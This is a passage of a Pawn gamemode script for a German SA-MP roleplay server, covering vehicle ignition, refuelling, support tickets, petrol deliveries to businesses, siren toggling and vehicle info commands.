								format(motorstring, sizeof(motorstring), "%s betätigt die Zündung", GetName(playerid));
								SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
				  				SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du betätigst die Zündung.");
							}
						}
					}
					else
					{
						if(PlayerInfo[playerid][pAdmin] > 2000)
						{




				          	if(engine == VEHICLE_PARAMS_ON)
					   		{
						    	SetVehicleParamsEx(vid,VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
								format(motorstring, sizeof(motorstring), "%s stellt den Motor ab", GetName(playerid));
								SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du stellst den Motor Administrativ ab.");
							}
							else
							{
								format(motorstring, sizeof(motorstring), "%s betätigt die Zündung", GetName(playerid));
								SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
					  			SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du betätigst Administrativ die Zündung.");
							}


							return 1;





						}
					    SCM(playerid, COLOR_GREY, "Du besitzt keinen Schlüssel für dieses Fahrzeug!");
					}
				}
			}
	    }




	    /*
	 	for(new fc;fc<sizeof(OrgAuto);fc++)// Organisatiosnfahrzeug
		{
		    if(vid == OrgAuto[fc][LocalID])
		    {
				if(PlayerInfo[playerid][pOrgMember] == OrgAuto[fc][autoorgid])
				{
				    if(engine == VEHICLE_PARAMS_ON)
			   		{
			    		SetVehicleParamsEx(vid,VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
						format(motorstring, sizeof(motorstring), "%s stellt den Motor ab", GetName(playerid));
						SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du stellst den Motor ab.");
					}
					else
					{
						format(motorstring, sizeof(motorstring), "%s betätigt die Zündung", GetName(playerid));
						SetPlayerChatBubble(playerid, motorstring, COLOR_PURPLE, 70.0, 5000);
	  					SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du betätigst die Zündung.");
					}
					return 1;
				}
				SCM(playerid, COLOR_GREY, "Du besitzt keinen Schlüssel für dieses Fahrzeug!");
			}
			//SCM(playerid, COLOR_GREY, "ok");
		}


	   // OrgAuto[idx][orgautokaufpreis]
        return 1;*/
        return 1;
	}
	if(strcmp(cmd, "/fill", true) == 0 || strcmp(cmd, "/tanken", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(IsPlayerInAnyVehicle(playerid))
		    {
				for(new b = 0; b < sizeof(TankeInfo); b++)
				{
					if(IsPlayerInRangeOfPoint(playerid,25.0, TankeInfo[b][tEntranceX], TankeInfo[b][tEntranceY], TankeInfo[b][tEntranceZ]))
					{
					    if(IsANoTachoVehicle(GetPlayerVehicleID(playerid)))
					    {
					        SendClientMessage(playerid,COLOR_GRAD2," Du kannst kein Fahrrad betanken!");
					    }
					    else
					    {
					    	new engine, lights, alarm, doors, bonnet, boot, objective;
							GetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective);
							if(engine == 0||engine == -1)
							{
								if(TankeInfo[b][tProducts] < 0)
								{
									GameTextForPlayer(playerid, "~r~Ausverkauft", 5000, 1);
									return 1;
								}


								printf("%d", engine);
								printf("%s", engine);
			//					if(engine != 0)
			//					{
			//						SendClientMessage(playerid, COLOR_GREY, "Du musst erst den Motor abstellen!");
			//						return 1;
		//						}
								SetTimer("Fillup",RefuelWait,0);
								Refueling[playerid] = 1;
								FreezePlayer(playerid);
								SendClientMessage(playerid,COLOR_WHITE,"Dein Fahrzeug wird betankt, Bitte warten....");

							}
							else
							{
								SendClientMessage(playerid, COLOR_GREY, "Du musst erst den Motor abstellen!");
								return 1;
							}
						}
					}
				}
			}
		}
    	return 1;
	}
/*
    if(strcmp(cmd, "/report", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][paMuted] == 1)
	        {
				new stringd[128];
	            format(stringd, sizeof(stringd), "Du bist noch für %d Minuten vom Support System ausgeschlossen!", PlayerInfo[playerid][paMutedTime]);
	            SendClientMessage(playerid, COLOR_GRAD2, stringd);
				return 1;
			}
	        if(JustReported[playerid] == 1)
	        {
	            SendClientMessage(playerid, COLOR_GREY, "Bitte warte 30 Sekunden bis du den Nächsten Report schreiben kannst !");
	            return 1;
			}
	        GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[128];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: (/re)port [Text]");
				return 1;
			}
			new stringrp[200];
			GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
			format(stringrp, sizeof(stringrp), "Meldung von: [ID:%d]%s", playerid, sendername);
			ABroadCast(0xE19898AA,stringrp,1);
			SBroadCast(0xE19898AA,stringrp,1);
			format(stringrp, sizeof(stringrp), "Meldung: %s", (result));
			ABroadCast(0xE19898AA,stringrp,1);
			SBroadCast(0xE19898AA,stringrp,1);
			ABroadCast(0xA04C4CAA,"Tippe '/ar [SpielerID]' or '/tr [SpielerID]'",1);
			SendClientMessage(playerid, 0x96C184AA, "Dein Report wurde an alle Admins gesendet die Online sind.");
			JustReported[playerid] = 1;
			PlayerNeedsHelp[playerid] = 1;
			SetTimerEx("ReportReset", 30000, false, "i", playerid);
	    }
	    return 1;
	}
*/
	if(strcmp(cmd,"/showreports",true) == 0)
	{
		if(IsPlayerConnected(playerid))
		{
			if(PlayerInfo[playerid][pAdmin] > 0 || PlayerInfo[playerid][pSupporter] > 0)
			{
				new pname[128];
			    SendClientMessage(playerid,COLOR_LIGHTBLUE,"|-------------Support-Tickets-------------|");
			    for(new i = 0;i<MAX_PLAYERS; i++)
			    {
			        if(PlayerNeedsHelp[i] == 1)
			        {
			            GetPlayerName(i, pname, sizeof(pname));
			            format(string, sizeof(string),"Ticket von %s ID: %d | Status: Unbearbeitet",pname, i);
			            SendClientMessage(playerid,COLOR_LIGHTRED,string);
					}
				}
			    SendClientMessage(playerid,COLOR_LIGHTBLUE,"|-----------------------------------------|");
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD2,"INFO:Du bist kein Administrator/Supporter!");
			}
		}
		return 1;
	}
    if(strcmp(cmd, "/ar", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(gPlayerLogged[playerid] == 0)
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du musst Eingeloggt sein !");
	            return 1;
	        }
	        if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pSupporter] >= 1)
	        {
	            tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
			    	SendClientMessage(playerid, COLOR_WHITE, "Benutze: /ar [SpielerID/GetName]");
			    	return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {

				        if(giveplayerid == playerid)
				        {
			    		SendClientMessage(playerid, COLOR_GRAD2, "Du kannst deine Eigenden Reports nicht annehmen!");
			    		return 1;
				        }
				      /*  if(PlayerNeedsHelp[giveplayerid] == 1)
				        {*/
				            if(PlayerNeedsHelp[giveplayerid] == 1)
				            {
				            	PlayerInfo[playerid][pAdminTickets] += 1;
							}
				            PlayerNeedsHelp[giveplayerid] = 0;
				            GetPlayerName(playerid, sendername, sizeof(sendername));
							GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							format(string, sizeof(string), "Support: %s hat die Meldung von: (%d) %s Angenommen.", sendername, giveplayerid, giveplayer);
							ABroadCast(COLOR_YELLOW, string, 1);
							SendClientMessage(playerid, COLOR_YELLOW,"Schreib nun mit dem Spieler per Chat du bist Automatisch Verbunden.");
							SendClientMessage(playerid, COLOR_YELLOW,"Du kannst den Report mit '/cr [SpielerID/GetName]' schließen");



							format(string, sizeof(string), "* %s (%d) %s hat dein Ticket Angenommen, er wird dich nun Supporten.",GetPlayerAdminName(playerid), playerid, sendername);





							SendClientMessage(giveplayerid, COLOR_GREEN, string);
							SendClientMessage(playerid, COLOR_LIGHTGREEN,"Du kannst nun per Chat mit dem Spieler Schreiben.");

							reportsheute++;
							ReportCallNumber[playerid] = reportsheute;
							ReportCallNumber[giveplayerid] = reportsheute;    // wurde die public varibale jz auch hochgesetzt? wtf

     						ReportCall[giveplayerid] = playerid;
                            ReportCall[playerid] = giveplayerid; //Verbinde zum Reporter


				        }
				        else
				        {
				            SendClientMessage(playerid, COLOR_GREY, "   Der Spieler hat keine Report anfrage !");
				            return 1;
				        }
				    //}
				}
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Administrator ! ");
	            return 1;
	        }
	    }
	    return 1;
	}

	if(strcmp(cmd, "/tr", true) == 0) // By Ellis
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(gPlayerLogged[playerid] == 0)
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du musst Eingeloggt sein !");
	            return 1;
	        }
	        if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pSupporter] >= 1)
	        {
	            tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
			    	SendClientMessage(playerid, COLOR_WHITE, "HINT: /tr [SpielerID/GetName]");
			    	return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        if(PlayerNeedsHelp[giveplayerid] == 1)
				        {
				            PlayerNeedsHelp[giveplayerid] = 0;
				            GetPlayerName(playerid, sendername, sizeof(sendername));
							GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							format(string, sizeof(string), "AdmWarning: %s hat die /report Anfrage von [ID:%d]%s gelöscht.", sendername, giveplayerid, giveplayer);
							ABroadCast(COLOR_YELLOW, string, 1);
							format(string, sizeof(string), "** Administrator [ID:%d]%s hat deine /report Anfrage verweigert !", playerid, sendername);
							SendClientMessage(giveplayerid, 0xB35959AA, string);
				        }
				        else
				        {
				            SendClientMessage(playerid, COLOR_GREY, "   Der Spieler hat keine Report anfrage !");
				            return 1;
				        }
				    }
				}
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Administrator ! ");
	            return 1;
	        }
	    }
	    return 1;
	}
	if(strcmp(cmd, "/cr", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(gPlayerLogged[playerid] == 0)
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du musst Eingeloggt sein !");
	            return 1;
	        }
	        if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pSupporter] >= 1)
	        {
	            tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
			    	SendClientMessage(playerid, COLOR_WHITE, "Benutze: /cr [SpielerID/GetName]");
			    	return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
						GetPlayerName(playerid, sendername, sizeof(sendername));
						GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						format(string, sizeof(string), "** Adminstrator [ID:%d]%s hat den Report geschlossen!", playerid, sendername);
						SendClientMessage(giveplayerid, COLOR_LIGHTGREEN, string);
						format(string, sizeof(string), "** Du hast den /report geschlossen!", playerid, sendername);
						SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
		                ReportCall[playerid] = 999;
						ReportCall[giveplayerid] = 999;
					}
				}
    		}
		}
	    return 1;
	}








   	if(strcmp(cmd, "/findcar", true) == 0)
	{
		if(!Dtc_PlayerHaveCar[playerid][Dtc_PlayerKey[playerid]])
		{
		SendClientMessage(playerid, COLOR_GREY, "Du besitzt kein Fahrzeug auf diesem Schlüssel!!");
		return 1;
		}
		new Float:vehx, Float:vehy, Float:vehz;
 		GetVehiclePos(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId], vehx, vehy, vehz);
	 	SetPlayerCheckpoint(playerid, vehx, vehy, vehz, 5.0);
		SendClientMessage(playerid, COLOR_GRAD2,"Das Auto wurde erfolgreich vom Sateliten gefunden!");
		return 1;
	}
//==================================SETHP======================================
/*
	if(strcmp(cmd, "/sethp", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, " /sethp [playerid] [Leben]");
				return 1;
			}
			new playa;
			new health;
			playa = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			health = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 4)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
						SetPlayerHealth(playa, health);
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist kein Admin.!");
			}
		}
		return 1;
	}
*/
//===============================SETARMOR====================================
/*
	if(strcmp(cmd, "/setarmor", true) == 0 || strcmp(cmd, "/setarmour", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /setarmor [playerid] [armor]");
				return 1;
			}
			new playa;
			new health;
			playa = ReturnUser(tmp);
			tmp = strtoknew(cmdtext, idx);
			health = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 4)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
						SetPlayerArmour(playa, health);
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Du bist kein Administrator!");
			}
		}
		return 1;
	}
*/
	if(strcmp(cmd, "/petrol", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pMember] >= 0 || PlayerInfo[playerid][pLeader] >= 0)
	        {
				tmp = strtoknew(cmdtext, idx);
				new aktion[200];
				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOR_GOLD, "____________________________|Transport|____________________________");
				    SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /petrol [Aktion]");
				    SendClientMessage(playerid, COLOR_WHITE, "Verfügbare Funktionen: kaufen, verkaufen, anzeigen");
				    return 1;
				}
				if(strcmp(tmp, "kaufen", true) == 0)
				{
					if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 515 || GetVehicleModel(GetPlayerVehicleID(playerid)) != 514)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Dieses Fahrzeug kann keine Produkte ausliefern!");
					    return 1;
					}

					if(!IsPlayerInRangeOfPoint(playerid, 50, -1280.7257,2719.6504,50.0625))
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Du bist nicht in LV am Abholpunkt!");
					    return 1;
					}
				    aktion = strtoknew(cmdtext, idx);
				    if(!strlen(aktion))
				    {
				        SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /petrol kaufen [Anzahl]");
				        SendClientMessage(playerid, COLOR_GRAD1, "*Preis pro Produkt: 50$, Maximale Produkte: 100");
						return 1;
					}
					new menge;
					menge = strval(aktion);
					new preis = menge*50;
//					if(menge > LSAWaren)
//					{
//					    SendClientMessage(playerid, COLOR_GRAD1, "Derzeit haben wir nicht soviele Pakete auf Lager!");
//					    return 1;
//					}
					if(menge < 1 || menge > 100)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Du kannst mindestens 1 paket und höchstens 100 paket kaufen!");
						return 1;
					}
					if(menge + ProdsDabei[playerid] > 100)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "So viele Pakete passen nicht mehr rein!");
						format(string, sizeof(string), "Produkte dabei: %d/100",ProdsDabei[playerid]);
						SendClientMessage(playerid, COLOR_GRAD1, string);
					    return 1;
					}
					if(preis > GetPlayerMoneySave(playerid))
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht genug Geld!");
					    return 1;
					}
					ProdsDabei[playerid] = menge;
					LSAWaren -= menge;
					GivePlayerMoneySave(playerid, -preis);
					format(string, sizeof(string), "*Du hast %d Pakete für %d$ gekauft.", menge, preis);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du kannst sie nun an Geschäfte verkaufen.");
					new string2[200];
					format(string2, sizeof(string2), "[Benzin / Lagerverkauf]\nPreis pro Paket: 50$\nPakete auf Lager: %d\nKaufen mit /petrol\nEinkauf nur mit Roadtrain", LSAWaren);
					Update3DTextLabelText(LSWText, 0xFFFFFFFF, string2);
					SaveStuff();
					return 1;
				}
				else if(strcmp(tmp, "verkaufen", true) == 0)
				{
				    aktion = strtoknew(cmdtext, idx);
				    if(!strlen(aktion))
				    {
				        SendClientMessage(playerid, COLOR_GRAD1, "Benutzung: /petrol verkaufen [Anzahl]");
						return 1;
					}
					if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 515)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Dieses Fahrzeug kann keine Pakete ausliefern!");
					    return 1;
					}
					for(new i = 0; i < sizeof(BizzInfo); i++)
					{
					    new menge = strval(aktion);
					    new preis = menge*BizzInfo[i][bPriceProd];
						if (IsPlayerInRangeOfPoint(playerid,10.0,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]) && BizzInfo[i][bOwned] == 1)
						{
							if(BizzInfo[i][bProducts] + menge > BizzInfo[i][bMaxProducts])
							{
								GameTextForPlayer(playerid, "~r~Wir benoetigen nicht soviele Pakete!", 5000, 1);
								PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
								return 1;
							}
							if(preis > BizzInfo[i][bTill])
							{
								GameTextForPlayer(playerid, "~r~Wir haben zu wenig Geld!", 5000, 1);
								PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
								return 1;
							}
							ProdsDabei[playerid] -= menge;
							GivePlayerMoneySave(playerid, preis);
							BizzInfo[i][bProducts] += menge;
							BizzInfo[i][bTill] -= preis;
//							new string3[200];
//          		    		format(string3, sizeof(string3), "[%s]\nInhaber: %s\nTeilhaber: %s\nEintrittspreis: %d$\nLevel: %d\nProdukte: %d/%d\nPreis pro Produkt: %d", BizzInfo[i][bMessage],BizzInfo[i][bOwner],BizzInfo[i][bExtortion],BizzInfo[i][bEntranceCost],BizzInfo[i][bLevelNeeded],BizzInfo[i][bProducts],BizzInfo[i][bMaxProducts],BizzInfo[i][bPriceProd]);
//						    Update3DTextLabelText(BizzInfo[i][bText],COLOR_BUYED,string3);
							format(string, sizeof(string), "%d Paket für %d$ verkauft, Pakete: %d/100.", menge,preis,ProdsDabei[playerid]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							ConsumingMoney[playerid] = 1;
							OnPropUpdate_b(i);
							return 1;
						}
					}
					for(new s = 0; s < sizeof(SBizzInfo); s++)
					{
					    new menge = strval(aktion);
					    new preis = menge*SBizzInfo[s][sbPriceProd];
						if (IsPlayerInRangeOfPoint(playerid,10.0,SBizzInfo[s][sbEntranceX], SBizzInfo[s][sbEntranceY], SBizzInfo[s][sbEntranceZ]) && SBizzInfo[s][sbOwned] == 1)
						{
							if(SBizzInfo[s][sbProducts] + menge > SBizzInfo[s][sbMaxProducts])
							{
								GameTextForPlayer(playerid, "~r~Wir benoetigen nicht soviele Pakete!", 5000, 1);
								PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
								return 1;
							}
							if(menge > ProdsDabei[playerid])
							{
								format(string, sizeof(string), "Du hast nur %d Pakete dabei!", ProdsDabei[playerid]);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								return 1;
							}
							if(preis > SBizzInfo[s][sbTill])
							{
								GameTextForPlayer(playerid, "~r~Wir haben zu wenig Geld!", 5000, 1);
								PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
								return 1;
							}
							ProdsDabei[playerid] -= menge;
							format(string, sizeof(string), "%d Paket für %d$ verkauft, Pakete: %d/100.", menge,preis,ProdsDabei[playerid]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							GivePlayerMoneySave(playerid, preis);
							SBizzInfo[s][sbProducts] += menge;
							SBizzInfo[s][sbTill] -= preis;
//							new string4[200];
//	    					format(string4, sizeof(string4), "[%s]\nInhaber: %s\nTeilhaber: %s\nEintrittspreis: %d$\nLevel: %d\nProdukte: %d/%d\nPreis pro Produkt: %d", SBizzInfo[s][sbMessage],SBizzInfo[s][sbOwner],SBizzInfo[s][sbExtortion],SBizzInfo[s][sbEntranceCost],SBizzInfo[s][sbLevelNeeded],SBizzInfo[s][sbProducts],SBizzInfo[s][sbMaxProducts], SBizzInfo[s][sbPriceProd]);
//					    	Update3DTextLabelText(SBizzInfo[s][sbText],COLOR_BUYED,string4);
							ConsumingMoney[playerid] = 1;
							OnPropUpdate_sb(s);
							return 1;
						}
					}
					for(new t = 0; t < sizeof(TankeInfo); t++)
					{
					    new menge = strval(aktion);
					    new preis = menge*TankeInfo[t][tPriceProd];
						if (IsPlayerInRangeOfPoint(playerid,10.0,TankeInfo[t][tEntranceX], TankeInfo[t][tEntranceY], TankeInfo[t][tEntranceZ]) && TankeInfo[t][tOwned] == 1)
						{
							if(TankeInfo[t][tProducts] + menge > TankeInfo[t][tMaxProducts])
							{
								GameTextForPlayer(playerid, "~r~Wir benoetigen nicht soviel Benzin!", 5000, 1);
								PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
								return 1;
							}
							if(menge > ProdsDabei[playerid])
							{
								format(string, sizeof(string), "Du hast nur noch %d Liter Benzin dabei!", ProdsDabei[playerid]);
								SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
								return 1;
							}
							if(preis > TankeInfo[t][tTill])
							{
								GameTextForPlayer(playerid, "~r~Wir haben zu wenig Geld!", 5000, 1);
								PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
								return 1;
							}
							ProdsDabei[playerid] -= menge;
							format(string, sizeof(string), "%dl Benzin für %d$ verkauft, Restliches Benzin: %d/100.", menge,preis,ProdsDabei[playerid]);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							GivePlayerMoneySave(playerid, preis);
							TankeInfo[t][tProducts] += menge;
							TankeInfo[t][tTill] -= preis;
							ConsumingMoney[playerid] = 1;
							OnPropUpdate_t(t);
							return 1;
						}
					}
					GameTextForPlayer(playerid, "~r~Kein Business in der Naehe", 5000, 1);
					return 1;
				}
				else if(strcmp(tmp, "anzeigen", true) == 0)
				{

					if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 515 ||GetVehicleModel(GetPlayerVehicleID(playerid)) != 514)
					{
					    SendClientMessage(playerid, COLOR_GRAD1, "Du bist in keinem Roadtrain");
					    return 1;
					}
					new prods = ProdsDabei[playerid];
					format(string, sizeof(string), "* Benzin dabei: %d/100", prods);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					return 1;
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "ERROR!");
			}
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "Logg dich erst ein!");
		}
		return 1;
	}
	if(strcmp(cmd,"/addsirene", true) == 0)
    {
        if(PlayerInfo[playerid][pAdmin] > 2000)
        {
	 	    new vehicleid = GetPlayerVehicleID(playerid);
	 	    if(GetVehicleModel(vehicleid) == 560 || GetVehicleModel(vehicleid) == 525)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast die Sirene erfolgreich instaliert!");
			    for(new fc;fc<sizeof(FactionCars);fc++)
				{
				    ///if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
					//{
				        if(FactionCars[fc][fCarid] == vehicleid)
						{
							FactionCars[fc][fTuning][14] = 1;
							DestroyAndCreateFactionCar(fc);
						}
				   // }
				}
		    }
	    }
	    return 1;
	}
	if(strcmp(cmd,"/removesirene", true) == 0)
    {
        if(PlayerInfo[playerid][pAdmin] > 2000)
        {
	 	    new vehicleid = GetPlayerVehicleID(playerid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast die Sirene erfolgreich entfernt!");
			    for(new fc;fc<sizeof(FactionCars);fc++)
				{
				    if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
					{
				        if(FactionCars[fc][fCarid] == vehicleid)
						{
							FactionCars[fc][fTuning][14] = 0;
							DestroyAndCreateFactionCar(fc);
						}
				    }
		    }
	    }
	    return 1;
	}
	if (strcmp("/carinfo", cmd, true, 10) == 0)
    {
        if(PlayerInfo[playerid][sMember] == 24)
        {
        if(!IsPlayerInAnyVehicle(playerid))
        {
        SendClientMessage(playerid, COLOR_GREY, "Du bist in keinen Fahrzeug!");
        return 1;
        }
        new vehicleid,string3[128];
        vehicleid = GetPlayerVehicleID(playerid);
        if(!IsADtCar(vehicleid))
        {
	       for(new fc;fc<sizeof(FactionCars);fc++)// Fraktionsfahrzeug
			{
		        if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
				{
		            if(vehicleid == FactionCars[fc][fCarid])
					{
							new carstring[128];
							if(FactionCars[fc][fFaction] == 1)
							{
			                    carstring = "LSPD";
							}
							else if(FactionCars[fc][fFaction] == 2)
							{
			                    carstring = "F.B.I";
							}
							else if(FactionCars[fc][fFaction] == 3)
							{
			                    carstring = "Bundeswehr";
							}
							else if(FactionCars[fc][fFaction] == 4)
							{
			                    carstring = "Sanitäter";
							}
							else if(FactionCars[fc][fFaction] == 5)
							{
			                    carstring = "Los Chicken Malos";
							}
							else if(FactionCars[fc][fFaction] == 6)
							{
			                    carstring = "Yakuza";
							}
							else if(FactionCars[fc][fFaction] == 7)
							{
			                    carstring = "Regierung";
							}
							else if(FactionCars[fc][fFaction] == 8)
							{
			                    carstring = "Hitman";
							}
							else if(FactionCars[fc][fFaction] == 9)
							{
			                    carstring = "San News";
							}
							else if(FactionCars[fc][fFaction] == 10)
							{
			                    carstring = "Transport GmbH";
							}
							else if(FactionCars[fc][fFaction] == 11)
							{
			                    carstring = "Fahrlehrer";
							}
							else if(FactionCars[fc][fFaction] == 12)
							{
			                    carstring = "Triaden";
							}
							else if(FactionCars[fc][fFaction] == 13)
							{
			                    carstring = "Grove Street";
							}
							else if(FactionCars[fc][fFaction] == 14)
							{
			                    carstring = "Ballas";
							}
							else if(FactionCars[fc][fFaction] == 15)
							{
			                    carstring = "Keine Ahnung";
							}
							else if(FactionCars[fc][fFaction] == 16)
							{
			                    carstring = "LS Vagos";
							}
							else if(FactionCars[fc][fFaction] == 17)
							{
			                    carstring = "Aztecas";
							}
							else if(FactionCars[fc][fFaction] == 18)
							{
			                    carstring = "SF Rifa";
							}
							else if(FactionCars[fc][fFaction] == 19)
							{
			                    carstring = "Red Soldiers";
							}
							else if(FactionCars[fc][fFaction] == 20)
							{
			                    carstring = "Terroristen";
							}
							else if(FactionCars[fc][fFaction] == 21)
							{
			                    carstring = "Wheelman";
							}
							else if(FactionCars[fc][fFaction] == 22)
							{
			                    carstring = "S.W.A.T";
							}
							else if(FactionCars[fc][fFaction] == 23)
							{
			                    carstring = "Russen Mafia";
							}
							else if(FactionCars[fc][fFaction] == 24)
							{
			                    carstring = "Ordnungsamt";
							}
						    format(string3, sizeof(string3), "Fahrzeug %s.\nBesitzer %s.\nFarbe %d/%d.\nKennzeichen %s.\nKilometer %d.\nTank %d/%d.\nLetzter Fahrer %s.",CarName[GetVehicleModel(vehicleid)-400], carstring,FactionCars[fc][fCol][0],FactionCars[fc][fCol][1],carstring,FactionCars[fc][fTuning][15],FactionCars[fc][fTuning][16],GetGasMax(GetVehicleModel(vehicleid)),GetName(gLastDriverFixed[vehicleid]));
							ShowPlayerDialog(playerid, 6665, DIALOG_STYLE_MSGBOX, "Carinfo", string3, "Ok", "Verlassen");
	           				//  SendClientMessage(playerid, COLOR_GRAD2, "Das ist kein Privatfahrzeug!");
                    }
                }
			}
    		return 1;
        }
        new carowner = GetDtCarOwner(vehicleid);
	    new slot = GetDtCarOwnerSlot(carowner,vehicleid);
        format(string3, sizeof(string3), "Fahrzeug %s.\nBesitzer %s.\nFarbe %d/%d.\nKennzeichen %s.\nKilometer %d.\nTank %d/%d.\nLetzter Fahrer %s.",CarName[GetVehicleModel(vehicleid)-400], GetName(carowner),PlayerCar[carowner][slot][CarC1],PlayerCar[carowner][slot][CarC2],PlayerCar[carowner][slot][Plate],PlayerCar[carowner][slot][Kilometer],PlayerCar[carowner][slot][Benzin],GetGasMax(GetVehicleModel(vehicleid)),GetName(gLastDriverFixed[vehicleid]));
		ShowPlayerDialog(playerid, 6665, DIALOG_STYLE_MSGBOX, "Carinfo", string3, "Ok", "Verlassen");
        return 1;
        }
        return 1;
    }
	if (strcmp("/lock", cmd, true, 10) == 0)
    {
        if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
